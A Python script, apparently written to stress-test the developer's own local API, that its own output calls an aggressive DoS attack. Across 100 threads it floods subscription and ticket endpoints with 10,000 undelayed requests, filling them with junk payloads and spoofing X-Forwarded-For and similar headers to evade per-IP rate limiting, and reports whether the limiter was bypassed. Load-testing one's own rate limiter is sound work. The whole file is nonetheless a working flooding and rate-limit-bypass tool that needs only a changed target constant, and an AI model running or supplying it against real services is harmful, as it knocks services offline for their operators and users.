#!/usr/bin/env python3
import requests
import random
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import sys


TARGET_HOST = "http://localhost:8080"
ENDPOINTS = [
    ("/api/subscriptions/", "POST"),
    ("/api/subscriptions/", "GET"),
    ("/api/tickets/", "POST"),
    ("/api/tickets/", "GET"),
]

NUM_REQUESTS = 10000
NUM_THREADS = 100
DELAY = 0
TIMEOUT = 5

# Brojači
success_count = 0
failed_count = 0
rate_limited_count = 0
error_count = 0
lock = threading.Lock()


def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"


def send_aggressive_request(request_num):
    global success_count, failed_count, rate_limited_count, error_count
    
    fake_ip = generate_fake_ip()
    
    headers = {
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "X-Client-IP": fake_ip,
        "Content-Type": "application/json"
    }
    
    # Biramo random endpoint
    endpoint, method = random.choice(ENDPOINTS)
    url = TARGET_HOST + endpoint
    
    try:
        if method == "POST":
            if "subscription" in endpoint:
                payload = {
                    "user_email": f"attacker{request_num}_{random.randint(1,9999)}@fake.com",
                    "plan_type": random.choice(["basic", "premium", "enterprise"])
                }
            else:
                payload = {
                    "user_email": f"attacker{request_num}_{random.randint(1,9999)}@fake.com",
                    "subscription_id": random.randint(1, 100),
                    "subject": f"Attack ticket {request_num} - " + "X" * 100,
                    "description": "Lorem ipsum " * 50,  # Veliki tekst
                    "priority": random.choice(["low", "medium", "high", "urgent"])
                }
            response = requests.post(url, json=payload, headers=headers, timeout=TIMEOUT)
        else:
            response = requests.get(url, headers=headers, timeout=TIMEOUT)
        
        with lock:
            if response.status_code == 201 or response.status_code == 200:
                success_count += 1
                if request_num % 100 == 0:  # Prikaži samo svaki 100-ti
                    print(f"#{request_num} SUCCESS (IP: {fake_ip})")
            elif response.status_code == 429:
                rate_limited_count += 1
            else:
                failed_count += 1
                
    except requests.exceptions.Timeout:
        with lock:
            error_count += 1
            if error_count % 50 == 0:
                print(f"#{request_num} TIMEOUT - Server overwhelmed!")
    except Exception as e:
        with lock:
            error_count += 1
            if error_count % 50 == 0:
                print(f"💥 #{request_num} ERROR: {type(e).__name__}")


def worker(request_numbers):
    for num in request_numbers:
        send_aggressive_request(num)
        if DELAY > 0:
            time.sleep(DELAY)


def print_stats():
    start_time = time.time()
    while True:
        time.sleep(5)
        elapsed = time.time() - start_time
        total = success_count + failed_count + rate_limited_count + error_count
        rps = total / elapsed if elapsed > 0 else 0
        
        print(f"\n{'='*70}")
        print(f"LIVE STATS (after {elapsed:.1f}s):")
        print(f"Success: {success_count}")
        print(f"Rate Limited: {rate_limited_count}")
        print(f"Failed: {failed_count}")
        print(f"Errors: {error_count}")
        print(f"Total: {total} / {NUM_REQUESTS}")
        print(f"Rate: {rps:.1f} requests/second")
        print(f"{'='*70}\n")


def run_aggressive_attack():
    global success_count, failed_count, rate_limited_count, error_count
    
    print("=" * 70)
    print("AGGRESSIVE DoS Attack - Maximum Server Load")
    print("=" * 70)
    print(f"Target: {TARGET_HOST}")
    print(f"Total requests: {NUM_REQUESTS:,}")
    print(f"Threads: {NUM_THREADS}")
    print(f"Delay: {DELAY}s (NO DELAY!)")
    print(f"Timeout: {TIMEOUT}s")
    print("=" * 70)
    print()
    
    # Proveri server
    try:
        response = requests.get(f"{TARGET_HOST}/api/subscriptions/", timeout=2)
        if response.status_code == 200:
            print("Server is reachable")
        else:
            print("Server responded with unexpected status")
    except:
        print("ERROR: Cannot reach server!")
        return
    
    print()
    print("WARNING: This attack will heavily stress your server!")
    print("Press Ctrl+C at any time to stop the attack!")
    print()
    print("Starting aggressive attack in 3 seconds...")
    time.sleep(3)
    print()
    
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            requests_per_thread = NUM_REQUESTS // NUM_THREADS
            futures = []
            
            for i in range(NUM_THREADS):
                start_idx = i * requests_per_thread
                end_idx = start_idx + requests_per_thread
                request_nums = list(range(start_idx, end_idx))
                futures.append(executor.submit(worker, request_nums))
            
            # Čekaj da svi završe
            for future in futures:
                future.result()
    
    except KeyboardInterrupt:
        print("\n\nAttack stopped by user (Ctrl+C)!")
        print(f"Stopping threads... Please wait...")
        time.sleep(1)
        sys.exit(0)
    
    elapsed_time = time.time() - start_time
    total = success_count + failed_count + rate_limited_count + error_count
    
    print()
    print("=" * 70)
    print("🏁 ATTACK COMPLETED!")
    print("=" * 70)
    print(f"Total time: {elapsed_time:.2f} seconds")
    print(f"Successful: {success_count:,}")
    print(f"Rate Limited: {rate_limited_count:,}")
    print(f"Failed: {failed_count:,}")
    print(f"Errors/Timeouts: {error_count:,}")
    print(f"Total processed: {total:,} / {NUM_REQUESTS:,}")
    print(f"Average rate: {total / elapsed_time:.1f} requests/second")
    print("=" * 70)
    print()
    
    # Realnija analiza rezultata
    if error_count > NUM_REQUESTS * 0.2:
        print("Server was heavily stressed! Many timeouts/errors occurred.")
    elif success_count > NUM_REQUESTS * 0.7:
        print("Rate limiter was BYPASSED! Most requests succeeded due to IP spoofing.")
    else:
        print("Mixed results - server handled some load but showed stress.")
    


if __name__ == "__main__":
    try:
        run_aggressive_attack()
    except KeyboardInterrupt:
        print("\n\nProgram interrupted")
        print(f"Final stats: {success_count} success, {error_count} errors")
        sys.exit(0)
        print(f"Final stats: {success_count} success, {error_count} errors")
